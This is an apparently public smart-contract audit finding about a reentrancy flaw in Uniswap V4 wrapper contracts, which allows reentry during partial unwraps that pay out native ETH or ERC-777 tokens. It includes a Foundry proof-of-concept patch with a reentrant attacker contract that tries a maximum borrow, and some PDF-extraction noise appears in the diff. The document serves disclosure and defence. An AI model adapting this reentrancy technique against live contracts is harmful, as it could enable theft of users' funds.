# [M] Unsafe external calls made during proportional LP fee transfers can be used to reenter wrapper contracts

## Summary
Severity: Medium
Contest weight: 0.0000
Dataset id: 23482
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
ERC721WrapperBase exposes two overloads of the unwrap() function to perform full and partial unwrap of the ERC-6909 position for a given tokenId. The partial unwrap is used to burn a specified amount of ERC-6909 tokens from the caller and handles proportional distribution of LP fees between all ERC-6909 holders through the virtual _unwrap() function, transferring tokens directly from the UniswapV3Pool and PoolManager for UniswapV3Wrapper and UniswapV4Wrapper respectively:
```solidity
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    // @audit - native ETH/ERC-777 token can be used to reenter here
    _burnFrom(from, tokenId, amount);
}
```
For wrappers configured to use underlying positions that contain either tokens with transfer hooks (e.g. ERC-777) or native ETH in the case of Uniswap V4, the external call can be leveraged by the user‑supplied `to` address to reenter execution before the sender's balance and the ERC‑6909 token total supply is decreased.  
Note that this is possible despite the application of the `callThroughEVC()` modifier. Execution ends up in `EthereumVaultConnector::call` which itself has the `nonReentrantChecksAndControlCollateral()` modifier applied; however, at this point control collateral is not in progress checks are deferred within the execution context, meaning it is possible to bypass the reverts in the modifier:
```solidity
/// @notice A modifier that verifies whether account or vault status checks are re-entered as well as
/// checks for,!
/// controlCollateral re-entrancy.
modifier nonReentrantChecksAndControlCollateral() {
{
    EC context = executionContext;
    if (context.areChecksInProgress()) {
        revert EVC_ChecksReentrancy();
    }
    if (context.isControlCollateralInProgress()) {
        revert EVC_ControlCollateralReentrancy();
    }
}
_;
}
```
Impact: The likelihood of this issue is medium/high since Uniswap V4 has support for native ETH which is commonly used as collateral across DeFi protocols. The impact is more difficult to quantify as it does not appear possible to leverage this reentrancy to bypass the vault protections for an undercollateralized borrow, due to reverts in deferred checks after the ERC‑6909 burn with `E_AccountLiquidity()`, or otherwise break the ERC‑6909 accounting. Recursive partial unwraps also appear to be unprofitable for an attacker.

## Proof of Concept
Apply the following patch and execute `forge test --mt test_reentrancyPoC -vvv`:
```diff
--- .../test/uniswap/UniswapV4Wrapper.t.sol | 95 ++++++++++++++++++-
1 file changed, 94 insertions(+), 1 deletion(-)
diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol,!
29
index 2fce3ed..d9eaf45 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -40,6 +40,46 @@ import {UniswapMintPositionHelper} from "src/uniswap/periphery/UniswapMintPositi
import {ActionConstants} from "lib/v4-periphery/src/libraries/ActionConstants.sol";
import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
+contract ReentrantBorrower {
+ bool entered;
+ ERC721WrapperBase wrapper;
+ uint256 tokenId;
+ IEVault eVault;
+ IEVC evc;
+
+ fallback() external payable {
+ if (!entered && address(wrapper) != address(0) && tokenId != 0 && address(eVault) !=
address(0)) {,!
+ console.log("reentrancy");
+ entered = true;
+
+ bool checksInProgress = evc.areChecksInProgress();
+ bool checksDeferred = evc.areChecksDeferred();
+ bool controlCollateralInProgress = evc.isControlCollateralInProgress();
+
+ assert(!checksInProgress);
+ assert(checksDeferred);
+ assert(!controlCollateralInProgress);
+
+ eVault.borrow(type(uint256).max, address(this));
+
+ }
+ }
+
+ function setEnabled(ERC721WrapperBase _wrapper, uint256 _tokenId, IEVault _eVault, IEVC _evc)
external {,!
+ wrapper = _wrapper;
+ tokenId = _tokenId;
+ eVault = _eVault;
+ evc = _evc;
+ }
+}
+
contract MockUniswapV4Wrapper is UniswapV4Wrapper {
using StateLibrary for IPoolManager;
@@ -125,7 +165,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
TestRouter public router;
- bool public constant TEST_NATIVE_ETH = false;
+ bool public constant TEST_NATIVE_ETH = true;
function deployWrapper() internal override returns (ERC721WrapperBase) {
currency0 = Currency.wrap(address(token0));
@@ -407,6 +447,59 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
}
}
+ function test_reentrancyPoC() public {
+ address attacker = address(new ReentrantBorrower());
+
+ LiquidityParams memory params = LiquidityParams({
+ tickLower: TickMath.MIN_TICK + 1,
30
+ tickUpper: TickMath.MAX_TICK - 1,
+ liquidityDelta: -19999
+ });
+
+ deal(token0, attacker, 100 * unit0);
+ deal(token1, attacker, 100 * unit1);
+ startHoax(attacker);
+ SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+ SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+ SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+ SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+ (tokenId,,) = boundLiquidityParamsAndMint(params, attacker);
+
+ startHoax(attacker);
+ wrapper.underlying().approve(address(wrapper), tokenId);
+ wrapper.wrap(tokenId, attacker);
+ wrapper.enableTokenIdAsCollateral(tokenId);
+
+ evc.enableCollateral(attacker, address(wrapper));
+ evc.enableController(attacker, address(eVault));
+
+ console.log("eVault.debtOfExact(attacker) before: %s", eVault.debtOfExact(attacker));
+ console.log("balanceOf(attacker, tokenId) before: %s", wrapper.balanceOf(attacker, tokenId));
+ console.log("balanceOf(attacker) before: %s", wrapper.balanceOf(attacker));
+
+ assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT());
+ uint256 balanceBefore = wrapper.balanceOf(attacker);
+
+ ReentrantBorrower(payable(attacker)).setEnabled(wrapper, tokenId, eVault, evc);
+
+ wrapper.unwrap(
+ attacker,
+ tokenId,
+ attacker,
+ wrapper.FULL_AMOUNT() * 99/100,
+ bytes("")
+ );
+
+ console.log("eVault.debtOfExact(attacker) after: %s", eVault.debtOfExact(attacker));
+ console.log("balanceOf(attacker, tokenId) after: %s", wrapper.balanceOf(attacker, tokenId));
+ console.log("balanceOf(attacker) after: %s", wrapper.balanceOf(attacker));
+
+ assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT() / 100);
+ assertGt(balanceBefore, wrapper.balanceOf(attacker));
+ }
+
function testSkim() public {
LiquidityParams memory params = LiquidityParams({
tickLower: TickMath.MIN_TICK + 1,
--
2.40.0
```

## Recommendation
While it has not been possible to identify a clear and material attack, it is still advised to consider the application of a reentrancy guard to prevent unsafe external calls made during the execution LP fee transfers being allowed to call back into the wrapper contracts.
